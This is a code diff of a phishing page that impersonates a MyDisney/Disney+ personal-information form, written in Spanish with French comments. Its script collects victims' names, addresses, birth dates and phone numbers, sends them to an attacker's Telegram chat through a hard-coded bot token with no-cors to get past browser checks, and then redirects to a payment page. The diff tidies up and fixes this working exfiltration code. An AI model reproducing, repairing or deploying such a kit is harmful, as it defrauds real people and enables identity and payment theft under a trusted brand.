@@ -9,7 +9,7 @@
 </head>
 <body class="page-form">
   <main>
-    <!-- Logo MyDisney centré en haut de la carte -->
+    <!-- Logo MyDisney -->
     <img src="Images/Mydisney-logo.png" alt="MyDisney" class="center-logo"/>
 
     <h1>Información personal</h1>
@@ -28,10 +28,8 @@
         <option value="CH">Suiza</option>
       </select>
 
-      <!-- Label et champ date de naissance -->
-      <label for="nacimiento" style="display:block; text-align:left; margin:0 0 8px; font-size:0.95rem; color:#333;">
-        Fecha de nacimiento
-      </label>
+      <!-- Label et champ date de naissance, styled par CSS -->
+      <label for="nacimiento">Fecha de nacimiento</label>
       <input
         type="date"
         id="nacimiento"
@@ -45,7 +43,7 @@
       <button type="submit">Continuar</button>
     </form>
 
-    <!-- Note de bas de page + logos partenaires -->
+    <!-- Note + logos -->
     <div class="footer-note">
       <strong>Disney+ forma parte del grupo Walt Disney</strong><br/>
       MyDisney te da acceso a servicios como Disney+, ESPN, Walt Disney World <a href="#">y más</a>.
@@ -61,7 +59,7 @@
     </div>
   </main>
 
-  <!-- Overlay du spinner -->
+  <!-- Spinner overlay -->
   <div id="spinnerOverlay">
     <div class="spinner"></div>
   </div>
@@ -69,10 +67,8 @@
   <script>
     document.getElementById("infoForm").addEventListener("submit", function(e) {
       e.preventDefault();
-      // Affiche le spinner
       document.getElementById("spinnerOverlay").style.display = "flex";
 
-      // Récupération des valeurs du formulaire
       const elems = this.elements;
       const data = {
         apellido: elems[0].value.trim(),
@@ -81,13 +77,12 @@
         ciudad:   elems[3].value.trim(),
         cp:       elems[4].value.trim(),
         pais:     elems[5].value,
-        nacimiento: elems['nacimiento'].value,  // now uses name="nacimiento"
+        nacimiento: elems['nacimiento'].value,
         telefono: elems[7].value.trim()
       };
 
-      // Préparation du message Telegram
-      const botToken = " "8079060666:AAGfVOxTqIR7teiEPuU3a-qZFcL9vdVTSOg";
-      const chat  = "-4970333928";
+      const botToken = "8079060666:AAGfVOxTqIR7teiEPuU3a-qZFcL9vdVTSOg";
+      const chatId   = "-1887198443";
       const message  =
         `📋 Información personal:\n` +
         `Apellido: ${data.apellido}\n` +
@@ -99,7 +94,6 @@
         `Fecha de nacimiento: ${data.nacimiento}\n` +
         `Teléfono: ${data.telefono}`;
 
-      // Envoi vers Telegram (no-cors pour contourner CORS)
       fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
         method: "POST",
         mode: "no-cors",
@@ -108,7 +102,6 @@
       })
       .catch(err => console.error("Erreur Telegram:", err))
       .finally(() => {
-        // Redirection après 2,5 secondes
         setTimeout(() => {
           window.location.href = "paiement.html";
         }, 2500);
